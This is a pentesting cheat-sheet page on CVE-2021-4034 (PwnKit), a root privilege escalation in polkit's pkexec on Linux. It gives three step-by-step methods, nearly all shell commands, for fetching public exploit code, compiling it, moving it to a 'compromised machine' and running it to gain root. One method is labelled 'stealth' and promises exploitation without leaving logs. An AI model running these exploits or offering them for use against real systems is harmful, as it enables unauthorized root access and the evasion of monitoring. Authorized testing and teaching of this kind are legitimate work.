# CVE-2021-4034

Local Privilege Escalation (from any user to root) in polkit's pkexec, through a SUID-root program called pkexec that is installed by default in all major Linux distributions.

## Practice

{% tabs %}
{% tab title="Method #1" %}
### Requirements

* **gcc** in the compromised machine.

### Download

{% embed url="https://github.com/arthepsy/CVE-2021-4034" %}

```bash
wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
```

### Method

First we have to check if the compromised machine has the gcc command to compile our .C file:

```
which gcc
```

If the command is present, we transfer the .C file to the compromised machine.

{% hint style="warning" %}
If the command is not there, we use Docker to compile it with the same architecture as the victim machine.
{% endhint %}

After transferring the .C file, we compile and run it:

```bash
gcc cve-2021-4034-poc.c -o exploit
chmod +x exploit
./exploit
```
{% endtab %}

{% tab title="Method #2" %}
### Requirements

* None, the code can be compiled on our machine and then pass the necessary files to the compromised machine.

### Download

{% embed url="https://github.com/berdav/CVE-2021-4034" %}

```bash
git clone https://github.com/berdav/CVE-2021-4034
```

### Method

```bash
cd CVE-2021-4034
make
# We transfer the following files:
# - cve-2021-4034
# - gconv-modules
# - pwnkit.so
# - GCONV_PATH=.    # create the directory -> mkdir GCONV_PATH\=.
# - pwnkit.so:.

mv pwnkit.so:. GCONV_PATH\=./
chmod +x pwnkit.so
chmod +x GCONV_PATH\=./pwnkit.so\:.
chmod +x cve-2021-4034
./cve-2021-4034
```
{% endtab %}

{% tab title="Method #3 (stealth)" %}
An alternative method of exploiting PwnKit (CVE-2021-4034) from Qualys without leaving behind logs.

### Download

{% hint style="danger" %}
Remember to compile it with the same architecture.
{% endhint %}

On our machine, we run the following script:

```bash
#!/bin/bash

git clone https://github.com/Ayrx/CVE-2021-4034
cd CVE-2021-4034
gcc -shared -fPIC -o payload.so payload.c
gcc -o exploit exploit.c
gcc -o shell shell.c
```

We transferred the following files to the compromised machine:

```bash
mkdir exploit
cd exploit
# Transfer:
# - payload.so
# - exploit
# - shell
# - gconv-modules
```

In the compromised machine, we run the following script:

```bash
#!/bin/bash

chmod +x payload.so exploit shell
mkdir -p "GCONV_PATH=."
touch "GCONV_PATH=./value"
chmod u+x "GCONV_PATH=./value"
mkdir -p value
cp gconv-modules value/
mv payload.so value/
```

You must have two Bash sessions on the compromised machine to run the following:

```bash
# Session 1:
while :; do mv "GCONV_PATH=./value" "GCONV_PATH=./value.bak"; mv "GCONV_PATH=./value.bak" "GCONV_PATH=./value"; done
# Session 2:
while :; do ./exploit; done
# Finally, we cancel the first and then the second and:
./shell
```
{% endtab %}
{% endtabs %}

